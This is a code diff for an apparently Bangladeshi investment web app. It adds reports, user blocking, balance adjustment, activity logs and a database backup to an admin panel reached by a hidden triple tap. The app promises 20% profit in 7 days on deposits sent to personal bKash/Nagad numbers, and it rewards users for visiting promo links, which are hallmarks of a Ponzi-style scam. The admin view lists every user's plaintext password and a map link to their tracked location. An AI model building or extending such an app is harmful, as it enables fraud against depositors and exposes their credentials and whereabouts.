+      <div class="field"><label class="label">URL</label><input class="admin-search" id="newTaskUrl" type="text"></div>
+      <div class="field"><label class="label">Reward (৳)</label><input class="admin-search" id="newTaskReward" type="number"></div>
+      <button class="admin-btn admin-green" onclick="addNewPromoTask()">ADD TASK</button>
       <div style="margin-top:15px;" id="adminTasksListContainer"></div>
     </div>
 
-    <!-- SETTINGS & BOT TAB -->
+    <!-- REPORTS TAB -->
+    <div id="adPaneReports" class="admin-card hidden">
+      <h3>📊 দৈনিক ও মাসিক আর্থিক প্রতিবেদন (Reports)</h3>
+      <div style="background:#050e09;padding:15px;border-radius:14px;border:1px solid #1c3328;line-height:2;font-size:13px;" id="adminReportsBox">
+        লোড হচ্ছে...
+      </div>
+    </div>
+
+    <!-- SETTINGS & DB TAB -->
     <div id="adPaneSettings" class="admin-card hidden">
-      <h3>⚙️ Investment & Telegram Bot Settings</h3>
+      <h3>⚙️ System Settings, Telegram & Database Backup</h3>
       <div class="field" style="display:flex;align-items:center;gap:10px;">
         <input type="checkbox" id="adminInvestEnabled" style="width:20px;height:20px;">
-        <label class="label" style="margin:0;cursor:pointer;">Enable Investment System</label>
+        <label class="label" style="margin:0;cursor:pointer;">Enable Investment</label>
       </div>
       <div class="admin-row">
         <div class="field"><label class="label">Min Invest (৳)</label><input class="admin-search" id="adminMinInvest" type="number"></div>
@@ -620,11 +398,22 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
         <div class="field"><label class="label">bKash Merchant</label><input class="admin-search" id="adminBkashNo" type="text"></div>
         <div class="field"><label class="label">Nagad Merchant</label><input class="admin-search" id="adminNagadNo" type="text"></div>
       </div>
-      <hr style="border-color:#1e3d2e;margin:15px 0;">
-      <h4>🤖 Telegram Bot Configuration</h4>
-      <div class="field"><label class="label">Telegram Bot Token</label><input class="admin-search" id="adminTgToken" type="text" placeholder="123456:ABC-DEF..."></div>
-      <div class="field"><label class="label">Telegram Chat ID</label><input class="admin-search" id="adminTgChatId" type="text" placeholder="-100xxxxxxxxxx"></div>
-      <button class="admin-btn admin-green" onclick="saveAdminSettings()">SAVE ALL SETTINGS</button>
+      <div class="field"><label class="label">Welcome Bonus Amount (৳)</label><input class="admin-search" id="adminWelcomeBonus" type="number"></div>
+      <div class="field"><label class="label">Telegram Bot Token</label><input class="admin-search" id="adminTgToken" type="text"></div>
+      <div class="field"><label class="label">Telegram Chat ID</label><input class="admin-search" id="adminTgChatId" type="text"></div>
+      <button class="admin-btn admin-green" onclick="saveAdminSettings()">SAVE SETTINGS</button>
+
+      <hr style="border-color:#1e3d2e;margin:20px 0;">
+      <h4>💾 Database Backup & Restore</h4>
+      <div style="display:flex;gap:10px;margin-top:10px;">
+        <button class="admin-btn admin-green" onclick="downloadDatabaseBackup()">Download JSON Backup</button>
+      </div>
+    </div>
+
+    <!-- ACTIVITY LOGS TAB -->
+    <div id="adPaneActivity" class="admin-card hidden">
+      <h3>📜 Admin Activity History</h3>
+      <div id="adminActivityListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
     </div>
 
   </div>
@@ -634,7 +423,8 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 const $ = id => document.getElementById(id);
 let currentUser = null;
 let watchId = null;
-let appGlobalSettings = { investEnabled: true, minInvest: 100, maxInvest: 50000, investRate: 20, investDuration: 7, adminBkash: "01700000000", adminNagad: "01800000000", telegramToken: "", telegramChatId: "" };
+let appGlobalSettings = { investEnabled: true, minInvest: 100, maxInvest: 50000, investRate: 20, investDuration: 7, adminBkash: "01700000000", adminNagad: "01800000000", welcomeBonus: 100, telegramToken: "", telegramChatId: "" };
+let globalAdminUsersCache = [];
 
 function validPhone(v){ return /^01[3-9]\d{8}$/.test(String(v || "").trim()); }
 function showMsg(id,text,type="error"){ const b=$(id); if(b){b.className="msg "+type; b.textContent=text; b.style.display="block";}}
@@ -666,8 +456,10 @@ async function fetchUserDataQuietly() {
   try {
     const r = await fetch(`/api/user/${currentUser.id}`);
     const d = await r.json();
-    if(d.ok) { currentUser = d.user; localStorage.setItem("v2_user_data", JSON.stringify(currentUser)); enterDashboardDirectly(); }
-    else { localStorage.removeItem("v2_user_data"); }
+    if(d.ok) {
+      if(d.user.isBlocked) { alert("Your account has been blocked by admin."); logout(); return; }
+      currentUser = d.user; localStorage.setItem("v2_user_data", JSON.stringify(currentUser)); enterDashboardDirectly();
+    } else { localStorage.removeItem("v2_user_data"); }
   } catch(e){}
 }
 
@@ -684,6 +476,7 @@ async function handleLogin() {
     const r = await fetch("/api/login", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone, password})});
     const d = await r.json();
     if(!r.ok) throw new Error(d.error || "লগইন ব্যর্থ");
+    if(d.user.isBlocked) throw new Error("This account is blocked.");
     currentUser = d.user;
     localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
     enterDashboardDirectly();
@@ -757,7 +550,6 @@ function updateDisplayValues() {
   $("profileDetails").innerHTML = `<b>নাম:</b> ${currentUser.name}<br><b>ফোন:</b> ${currentUser.phone}<br><b>রেফারেল কোড:</b> ${currentUser.referralCode}`;
 }
 
-// Deposit System
 function updateAdminWalletDisplay() {
   const method = $("depositMethod").value;
   $("depositMethodBadge").textContent = method + " Personal";
@@ -780,7 +572,6 @@ async function submitDeposit() {
   showMsg("depositMsg", "ডিপোজিট সফলভাবে সাবমিট হয়েছে!", "success");
 }
 
-// Profit Calculator & Amount Selection
 function setInvestAmount(amt, btn) {
   document.querySelectorAll('.amount-chip').forEach(c => c.classList.remove('active'));
   btn.classList.add('active');
@@ -793,11 +584,7 @@ function calculateProfitPreview() {
   const rate = appGlobalSettings.investRate || 20;
   const profit = Math.floor((amt * rate) / 100);
   const total = amt + profit;
-
-  $("calcPreviewBox").innerHTML = `
-    বিনিয়োগ: <b>৳${amt}</b> | সম্ভাব্য মুনাফা (${rate}%): <b style="color:var(--green)">৳${profit}</b><br>
-    মোট প্রাপ্য (মূলধন + লাভ): <b style="color:var(--gold)">৳${total}</b>
-  `;
+  $("calcPreviewBox").innerHTML = `বিনিয়োগ: <b>৳${amt}</b> | সম্ভাব্য মুনাফা (${rate}%): <b style="color:var(--green)">৳${profit}</b><br>মোট প্রাপ্য: <b style="color:var(--gold)">৳${total}</b>`;
 }
 
 function openInvestConfirmation() {
@@ -810,17 +597,10 @@ function openInvestConfirmation() {
   const profit = Math.floor((amt * rate) / 100);
   const total = amt + profit;
   const durationDays = appGlobalSettings.investDuration || 7;
-  
   const withdrawDate = new Date();
   withdrawDate.setDate(withdrawDate.getDate() + durationDays);
 
-  $("confirmModalBody").innerHTML = `
-    • বিনিয়োগের পরিমাণ: <b>৳${amt}</b><br>
-    • সম্ভাব্য মুনাফা (${rate}%): <b style="color:var(--green)">৳${profit}</b><br>
-    • মোট সম্ভাব্য রিটার্ন: <b style="color:var(--gold)">৳${total}</b><br>
-    • বিনিয়োগের মেয়াদ: <b>${durationDays} দিন</b><br>
-    • উত্তোলনের সম্ভাব্য তারিখ: <b>${withdrawDate.toLocaleDateString()}</b>
-  `;
+  $("confirmModalBody").innerHTML = `• পরিমাণ: <b>৳${amt}</b><br>• মুনাফা: <b style="color:var(--green)">৳${profit}</b><br>• মেয়াদ: <b>${durationDays} দিন</b>`;
   $("investConfirmModal").classList.add("show");
 }
 
@@ -829,27 +609,18 @@ async function confirmAndSubmitInvestment() {
   btn.disabled = true;
   $("investConfirmModal").classList.remove("show");
   const amt = Number($("calcAmount").value);
-
   try {
-    const r = await fetch("/api/invest/create", {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({ userId: currentUser.id, amount: amt })
-    });
+    const r = await fetch("/api/invest/create", { method: "POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ userId: currentUser.id, amount: amt }) });
     const d = await r.json();
-    if(!r.ok) throw new Error(d.error || "ইনভেস্টমেন্ট ব্যর্থ হয়েছে।");
-
+    if(!r.ok) throw new Error(d.error);
     currentUser.balance = d.balance;
     localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
     updateDisplayValues();
-    alert("🎉 Successful Investment! আপনার ইনভেস্টমেন্ট সফলভাবে Active হয়েছে।");
+    alert("🎉 Successful Investment!");
     loadUserInvestments();
     switchTab('invest');
-  } catch(e) {
-    alert("Error: " + e.message);
-  } finally {
-    btn.disabled = false;
-  }
+  } catch(e) { alert("Error: " + e.message); }
+  finally { btn.disabled = false; }
 }
 
 async function loadUserInvestments() {
@@ -859,35 +630,21 @@ async function loadUserInvestments() {
     const d = await r.json();
     const container = $("userInvestmentsContainer");
     const list = d.investments || [];
-
-    if(!list.length) {
-      container.innerHTML = `<div class="admin-note">কোনো ইনভেস্টমেন্ট হিস্ট্রি নেই।</div>`;
-      return;
-    }
-
+    if(!list.length) { container.innerHTML = `<div class="admin-note">কোনো ইনভেস্টমেন্ট নেই।</div>`; return; }
     container.innerHTML = list.map(inv => {
-      const now = new Date();
-      const unlockDate = new Date(inv.unlockDate);
-      const diffTime = unlockDate - now;
-      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+      const now = new Date(); const unlockDate = new Date(inv.unlockDate);
+      const diffDays = Math.ceil((unlockDate - now) / (1000 * 60 * 60 * 24));
       const canWithdraw = diffDays <= 0;
-
       return `
         <div class="record">
           <div class="record-top">
             <div>
-              <h4>ID: ${inv.id.slice(0,8)}...</h4>
-              <div class="meta">
-                বিনিয়োগ: ৳${inv.amount} | সম্ভাব্য লাভ: <b style="color:var(--green)">+৳${inv.profit}</b><br>
-                মেয়াদ শেষ: ${unlockDate.toLocaleDateString()}<br>
-                অবশিষ্ট সময়: <b style="color:var(--gold)">${diffDays > 0 ? diffDays + ' দিন বাকি' : 'মেয়াদ পূর্ণ হয়েছে!'}</b>
-              </div>
+              <h4>৳${inv.amount} | লাভ: +৳${inv.profit}</h4>
+              <div class="meta">অবশিষ্ট: <b style="color:var(--gold)">${diffDays > 0 ? diffDays + ' দিন' : 'পূর্ণ'}</b></div>
             </div>
             <span class="badge ${canWithdraw ? '' : 'pending'}">${canWithdraw ? 'Ready' : 'Active'}</span>
           </div>
-          <button class="task-btn" ${canWithdraw ? '' : 'disabled style="opacity:0.5;cursor:not-allowed;"'} onclick="claimInvestment('${inv.id}')" style="margin-top:10px;width:100%;">
-            ${canWithdraw ? 'Withdraw Profit & Capital' : 'Locked (মেয়াদ বাকী আছে)'}
-          </button>
+          <button class="task-btn" ${canWithdraw ? '' : 'disabled style="opacity:0.5;"'} onclick="claimInvestment('${inv.id}')" style="margin-top:10px;width:100%;">Claim</button>
         </div>
       `;
     }).join("");
@@ -896,29 +653,20 @@ async function loadUserInvestments() {
 
 async function claimInvestment(investId) {
   try {
-    const r = await fetch("/api/invest/claim", {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({ userId: currentUser.id, investId })
-    });
+    const r = await fetch("/api/invest/claim", { method: "POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ userId: currentUser.id, investId }) });
     const d = await r.json();
-    if(!r.ok) throw new Error(d.error || "উত্তোলন করা সম্ভব হয়নি।");
-
+    if(!r.ok) throw new Error(d.error);
     currentUser.balance = d.balance;
     localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
     updateDisplayValues();
-    alert("🎉 টাকা সফলভাবে আপনার মূল ওয়ালেটে যোগ হয়েছে!");
+    alert("🎉 সফলভাবে ক্লেম হয়েছে!");
     loadUserInvestments();
-  } catch(e) {
-    alert("Error: " + e.message);
-  }
+  } catch(e) { alert("Error: " + e.message); }
 }
 
-// Navigation Tabs
 function switchTab(tabName) {
   ['paneHome', 'paneDeposit', 'paneInvest', 'paneTasks', 'paneWithdraw', 'paneWallet', 'paneProfile'].forEach(p => $(p).classList.add('hidden'));
   ['navHome', 'navDeposit', 'navInvest', 'navTasks', 'navWithdraw', 'navWallet', 'navProfile'].forEach(n => $(n).className = 'nav-item');
-
   if(tabName=='home'){ $('paneHome').classList.remove('hidden'); $('navHome').className='nav-item active'; }
   else if(tabName=='deposit'){ $('paneDeposit').classList.remove('hidden'); $('navDeposit').className='nav-item active'; updateAdminWalletDisplay(); }
   else if(tabName=='invest'){ $('paneInvest').classList.remove('hidden'); $('navInvest').className='nav-item active'; loadUserInvestments(); }
@@ -933,9 +681,9 @@ async function loadPromoTasks() {
   $("promoTasksListContainer").innerHTML = (d.tasks || []).map(t => `
     <div class="task-item">
       <div><h4>${t.title}</h4><small>Reward: ৳${t.reward}</small></div>
-      <a class="task-btn" href="${t.url}" target="_blank" onclick="alert('টাস্ক ভিজিট সম্পন্ন হয়েছে!')">Visit Task</a>
+      <a class="task-btn" href="${t.url}" target="_blank">Visit</a>
     </div>
-  `).join("") || "<div class='admin-note'>কোনো টাস্ক উপলব্ধ নেই।</div>";
+  `).join("") || "<div class='admin-note'>টাস্ক নেই।</div>";
 }
 
 async function loadTransactions() {
@@ -947,20 +695,18 @@ async function submitWithdraw() {
   const amt = Number($("withdrawAmount").value);
   const number = $("withdrawNumber").value.trim();
   const method = $("withdrawMethod").value;
-  if(amt < 500 || amt > currentUser.balance) return showMsg("withdrawMsg", "সঠিক পরিমাণ দিন (ন্যূনতম ৫০০ টাকা)।");
+  if(amt < 500 || amt > currentUser.balance) return showMsg("withdrawMsg", "সঠিক পরিমাণ দিন।");
   const r = await fetch("/api/withdraw", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({userId:currentUser.id, method, number, amount:amt})});
   const d = await r.json();
-  if(r.ok) { currentUser.balance = d.balance; localStorage.setItem("v2_user_data", JSON.stringify(currentUser)); updateDisplayValues(); showMsg("withdrawMsg", "উইথড্র রিকোয়েস্ট সফল!", "success"); }
+  if(r.ok) { currentUser.balance = d.balance; localStorage.setItem("v2_user_data", JSON.stringify(currentUser)); updateDisplayValues(); showMsg("withdrawMsg", "সফল!", "success"); }
 }
 
 function openNotificationModal() { alert("কোনো নতুন নোটিফিকেশন নেই।"); }
 function logout() { localStorage.clear(); location.reload(); }
 
-/* Master Admin Script */
+/* Advanced Master Admin Script */
 let tapC = 0;
-$('adminTapTarget').addEventListener('click', () => {
-  tapC++; if(tapC >= 3) { tapC = 0; $("adminModal").classList.add("show"); }
-});
+$('adminTapTarget').addEventListener('click', () => { tapC++; if(tapC >= 3) { tapC = 0; $("adminModal").classList.add("show"); } });
 $("adminLoginBtn").addEventListener('click', async () => {
   const pin = $("adminPin").value;
   const r = await fetch("/api/admin/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({pin})});
@@ -969,14 +715,16 @@ $("adminLoginBtn").addEventListener('click', async () => {
 });
 
 function switchAdminTab(tab) {
-  ['adPaneUsers', 'adPaneDeposits', 'adPaneWithdraws', 'adPaneTasks', 'adPaneSettings'].forEach(p => $(p).classList.add('hidden'));
-  ['adTabBtnUsers', 'adTabBtnDeposits', 'adTabBtnWithdraws', 'adTabBtnTasks', 'adTabBtnSettings'].forEach(b => $(b).classList.remove('active'));
+  ['adPaneUsers', 'adPaneDeposits', 'adPaneWithdraws', 'adPaneTasks', 'adPaneReports', 'adPaneSettings', 'adPaneActivity'].forEach(p => $(p).classList.add('hidden'));
+  ['adTabBtnUsers', 'adTabBtnDeposits', 'adTabBtnWithdraws', 'adTabBtnTasks', 'adTabBtnReports', 'adTabBtnSettings', 'adTabBtnActivity'].forEach(b => $(b).classList.remove('active'));
   
   if(tab === 'users') { $('adPaneUsers').classList.remove('hidden'); $('adTabBtnUsers').classList.add('active'); }
   else if(tab === 'deposits') { $('adPaneDeposits').classList.remove('hidden'); $('adTabBtnDeposits').classList.add('active'); }
   else if(tab === 'withdraws') { $('adPaneWithdraws').classList.remove('hidden'); $('adTabBtnWithdraws').classList.add('active'); }
   else if(tab === 'tasks') { $('adPaneTasks').classList.remove('hidden'); $('adTabBtnTasks').classList.add('active'); loadAdminTasksList(); }
+  else if(tab === 'reports') { $('adPaneReports').classList.remove('hidden'); $('adTabBtnReports').classList.add('active'); loadAdminReports(); }
   else if(tab === 'settings') { $('adPaneSettings').classList.remove('hidden'); $('adTabBtnSettings').classList.add('active'); }
+  else if(tab === 'activity') { $('adPaneActivity').classList.remove('hidden'); $('adTabBtnActivity').classList.add('active'); loadAdminActivityLogs(); }
 }
 
 async function loadAdminDashboardData() {
@@ -984,55 +732,43 @@ async function loadAdminDashboardData() {
   const d = await r.json();
   if(!d.ok) return;
 
+  globalAdminUsersCache = d.users;
+  renderAdminUsers(d.users);
+
+  const totalDep = d.deposits.reduce((acc, x) => acc + (x.status==='Approved'?x.amount:0), 0);
+  const totalWd = d.withdrawals.reduce((acc, x) => acc + (x.status==='Approved'?x.amount:0), 0);
   $("adStatUsers").textContent = d.users.length;
-  $("adStatDeposits").textContent = `৳${d.deposits.reduce((acc, x) => acc + (x.status==='Approved'?x.amount:0), 0)}`;
-  $("adStatWithdraws").textContent = `৳${d.withdrawals.reduce((acc, x) => acc + (x.status==='Approved'?x.amount:0), 0)}`;
+  $("adStatDeposits").textContent = `৳${totalDep}`;
+  $("adStatWithdraws").textContent = `৳${totalWd}`;
+  $("adStatNet").textContent = `৳${totalDep - totalWd}`;
 
-  // Render Users with Map Link
-  $("adminUserListContainer").innerHTML = d.users.map(u => {
-    let lat = u.location?.latitude || 0;
-    let lon = u.location?.longitude || 0;
-    let mapLink = lat ? `https://maps.google.com/?q=${lat},${lon}` : '#';
-    return `
-      <div class="record">
-        <div class="record-top">
-          <div>
-            <h4>${u.name} (${u.phone})</h4>
-            <div class="meta">ব্যালেন্স: ৳${u.balance} | পাসওয়ার্ড: ${u.password}<br>
-            লোকেশন: ${lat ? `<a href="${mapLink}" target="_blank" style="color:var(--green)">📍 Google Map View</a>` : 'Unavailable'}</div>
-          </div>
-        </div>
-      </div>
-    `;
-  }).join("") || "<div class='admin-note'>কোনো ইউজার নেই।</div>";
-
-  // Render Deposits
+  // Deposits
   $("adminDepositListContainer").innerHTML = d.deposits.map(dep => `
     <div class="record">
       <div class="record-top">
         <div>
           <h4>৳${dep.amount} (${dep.method})</h4>
-          <div class="meta">TrxID: ${dep.trxId} | স্ট্যাটাস: ${dep.status}</div>
+          <div class="meta">TrxID: ${dep.trxId} | Status: ${dep.status}</div>
         </div>
         ${dep.status === 'Pending' ? `<button class="admin-btn admin-green" onclick="approveDeposit('${dep.id}')">Approve</button>` : ''}
       </div>
     </div>
-  `).join("") || "<div class='admin-note'>কোনো ডিপোজিট রিকোয়েস্ট নেই।</div>";
+  `).join("") || "<div class='admin-note'>কোনো ডিপোজিট নেই।</div>";
 
-  // Render Withdraws
+  // Withdraws
   $("adminWithdrawListContainer").innerHTML = d.withdrawals.map(w => `
     <div class="record">
       <div class="record-top">
         <div>
           <h4>৳${w.amount} (${w.method} - ${w.number})</h4>
-          <div class="meta">স্ট্যাটাস: ${w.status}</div>
+          <div class="meta">Status: ${w.status}</div>
         </div>
         ${w.status === 'Pending' ? `<button class="admin-btn admin-green" onclick="approveWithdraw('${w.id}')">Approve</button>` : ''}
       </div>
     </div>
-  `).join("") || "<div class='admin-note'>কোনো উইথড্র রিকোয়েস্ট নেই।</div>";
+  `).join("") || "<div class='admin-note'>কোনো উইথড্র নেই।</div>";
 
-  // Load Settings
+  // Settings
   $("adminInvestEnabled").checked = d.settings.investEnabled !== false;
   $("adminMinInvest").value = d.settings.minInvest || 100;
   $("adminMaxInvest").value = d.settings.maxInvest || 50000;
@@ -1040,8 +776,53 @@ async function loadAdminDashboardData() {
   $("adminInvestDuration").value = d.settings.investDuration || 7;
   $("adminBkashNo").value = d.settings.adminBkash || "01700000000";
   $("adminNagadNo").value = d.settings.adminNagad || "01800000000";
+  $("adminWelcomeBonus").value = d.settings.welcomeBonus || 100;
   $("adminTgToken").value = d.settings.telegramToken || "";
   $("adminTgChatId").value = d.settings.telegramChatId || "";
+}
+
+function renderAdminUsers(users) {
+  $("adminUserListContainer").innerHTML = users.map(u => {
+    let lat = u.location?.latitude || 0;
+    let lon = u.location?.longitude || 0;
+    let mapLink = lat ? `https://maps.google.com/?q=${lat},${lon}` : '#';
+    return `
+      <div class="record">
+        <div class="record-top">
+          <div>
+            <h4>${u.name} (${u.phone}) ${u.isBlocked ? '<span class="badge blocked">Blocked</span>' : ''}</h4>
+            <div class="meta">
+              Balance: ৳<b>${u.balance}</b> | Pass: ${u.password}<br>
+              Location: ${lat ? `<a href="${mapLink}" target="_blank" style="color:var(--green)">📍 Google Map</a>` : 'N/A'}
+            </div>
+          </div>
+          <div style="display:flex;gap:5px;flex-direction:column;">
+            <button class="admin-btn admin-green" onclick="adjustUserBalancePrompt('${u.id}', '${u.name}')">Adjust Bal</button>
+            <button class="admin-btn ${u.isBlocked ? 'admin-green' : 'admin-red'}" onclick="toggleBlockUser('${u.id}')">${u.isBlocked ? 'Unblock' : 'Block'}</button>
+          </div>
+        </div>
+      </div>
+    `;
+  }).join("") || "<div class='admin-note'>ইউজার পাওয়া যায়নি।</div>";
+}
+
+function filterAdminUsers() {
+  const q = $("adminUserSearchInput").value.toLowerCase();
+  const filtered = globalAdminUsersCache.filter(u => u.name.toLowerCase().includes(q) || u.phone.includes(q));
+  renderAdminUsers(filtered);
+}
+
+async function adjustUserBalancePrompt(userId, userName) {
+  const amt = prompt(`Adjust balance for ${userName}. Enter amount (+/- e.g. 500 or -200):`);
+  if(!amt || isNaN(amt)) return;
+  const reason = prompt("Enter audit reason for balance adjustment:") || "Admin adjustment";
+  const r = await fetch("/api/admin/user/adjust", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({userId, amount: Number(amt), reason}) });
+  if(r.ok) { alert("Balance adjusted successfully!"); loadAdminDashboardData(); }
+}
+
+async function toggleBlockUser(userId) {
+  const r = await fetch("/api/admin/user/toggle-block", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({userId}) });
+  if(r.ok) loadAdminDashboardData();
 }
 
 async function loadAdminTasksList() {
@@ -1059,16 +840,41 @@ async function addNewPromoTask() {
   const url = $("newTaskUrl").value.trim();
   const reward = Number($("newTaskReward").value);
   if(!title || !url || !reward) return alert("সকল তথ্য পূরণ করুন।");
-
   await fetch("/api/admin/task/add", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({title, url, reward}) });
   $("newTaskTitle").value = ""; $("newTaskUrl").value = ""; $("newTaskReward").value = "";
   loadAdminTasksList();
-  alert("টাস্ক সফলভাবে যোগ হয়েছে!");
 }
 
 async function deleteAdminTask(taskId) {
   await fetch("/api/admin/task/delete", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({taskId}) });
   loadAdminTasksList();
+}
+
+async function loadAdminReports() {
+  const r = await fetch("/api/admin/reports");
+  const d = await r.json();
+  if(!d.ok) return;
+  $("adminReportsBox").innerHTML = `
+    • <b>দৈনিক ডিপোজিট (আজ):</b> ৳${d.dailyDeposit}<br>
+    • <b>দৈনিক উইথড্র (আজ):</b> ৳${d.dailyWithdraw}<br>
+    • <b>মাসিক ডিপোজিট (চলতি মাস):</b> ৳${d.monthlyDeposit}<br>
+    • <b>মাসিক উইথড্র (চলতি মাস):</b> ৳${d.monthlyWithdraw}<br>
+    • <b>মোট রেজিস্টার্ড ইউজার:</b> ${d.totalUsers} জন
+  `;
+}
+
+async function loadAdminActivityLogs() {
+  const r = await fetch("/api/admin/activity");
+  const d = await r.json();
+  $("adminActivityListContainer").innerHTML = (d.logs || []).map(l => `
+    <div class="record">
+      <div><b>${l.action}</b><br><small style="color:var(--muted)">${new Date(l.date).toLocaleString()} | IP: ${l.ip || 'Admin'}</small></div>
+    </div>
+  `).join("") || "<div class='admin-note'>কোনো অ্যাক্টিভিটি লগ নেই।</div>";
+}
+
+function downloadDatabaseBackup() {
+  window.open("/api/admin/backup", "_blank");
 }
 
 async function approveDeposit(depId) {
@@ -1092,6 +898,7 @@ async function saveAdminSettings() {
       investDuration: Number($("adminInvestDuration").value),
       adminBkash: $("adminBkashNo").value.trim(),
       adminNagad: $("adminNagadNo").value.trim(),
+      welcomeBonus: Number($("adminWelcomeBonus").value),
       telegramToken: $("adminTgToken").value.trim(),
       telegramChatId: $("adminTgChatId").value.trim()
     })
